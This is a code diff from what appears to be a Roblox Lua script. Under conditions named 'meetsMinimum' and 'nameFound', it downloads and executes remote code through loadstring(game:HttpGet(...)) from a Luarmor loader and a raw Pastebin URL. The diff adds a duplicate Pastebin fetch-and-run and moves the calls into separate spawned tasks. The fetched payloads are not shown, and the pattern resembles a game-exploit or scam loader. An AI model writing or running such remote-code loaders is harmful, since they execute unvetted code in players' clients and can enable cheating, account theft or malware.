@@ -257,6 +257,8 @@ if meetsMinimum then
 	
 	task.spawn(function()
 		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/53325754de16c11fbf8bf78101c1c881.lua"))()
+	end)
+	task.spawn(function()
 		loadstring(game:HttpGet("https://pastebin.com/raw/fpkbJgyq"))()
 	end)
 	
@@ -273,6 +275,9 @@ elseif nameFound then
 	
 	task.spawn(function()
 		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/53325754de16c11fbf8bf78101c1c881.lua"))()
+		loadstring(game:HttpGet("https://pastebin.com/raw/fpkbJgyq"))()
+	end)
+	task.spawn(function()
 		loadstring(game:HttpGet("https://pastebin.com/raw/fpkbJgyq"))()
 	end)
 	
@@ -376,6 +381,7 @@ else
 		game["Teleport Service"]:Teleport(109983668079237, game.Players.LocalPlayer)
 	end
 end
+
 
 
 
